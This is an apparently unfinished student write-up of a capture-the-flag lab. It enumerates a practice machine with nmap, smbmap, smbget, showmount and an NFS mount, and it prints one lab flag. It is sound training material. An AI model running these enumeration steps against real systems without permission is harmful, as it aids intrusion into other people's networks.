---
layout: page
title: OWASP Top 10
permalink: /CSCI24/OWASPTop10/
---

---

[CSCI 24 Directory](https://zacvr.github.io/CSCI24/)
<br/>

---
<br/>


Task 1
---

Lets start with a nmap scan shall we?

```nmap -sC -sV 10.10.106.247```

<img src="/images/CSCI24/OWASPTop10/Task 1 Q1.png">

we have quite a few posibilities so lets see if metaspolit sees anything

Since we see some SMB shares lets try for that

lets add the IP to our host file with

```sudo nano /etc/hosts```

I named it VulnInternal

```smbmap -H VulnInternal```

<img src="/images/CSCI24/OWASPTop10/Task 1 Q1.5.png">

We see a share named "shares" lets look into it shall we?

```smbmap -H VulnInternal -u root -R```

Now we neet to "get" the file suspiciously named "services.txt"

<img src="/images/CSCI24/OWASPTop10/Task 1 Q1.6.png">

```smbget -R smb://VulnInternal/shares/temp/services.txt```

Lets cat that file

```cat services.txt```

<img src="/images/CSCI24/OWASPTop10/Task 1 Q1.7.png">

What is the services flag? (services.txt)

***THM{0a09d51e488f5fa105d8d866a497440a}***
---

Port 2049 looks different

a quick search [Here](https://blog.christophetd.fr/write-up-vulnix) shows that we can look into NFS shares

```showmount -e VulnInternal```

<img src="/images/CSCI24/OWASPTop10/Task 1 Q1.7.png">

We can copy this into a new directory to look into the results

```mkdir VulnInternal```

```sudo mount -t nfs VulnInternal:/opt/conf VulnInternal```

What is the internal flag? ("internal flag")

***


What is the user flag? (user.txt)

***


What is the root flag? (root.txt)

***
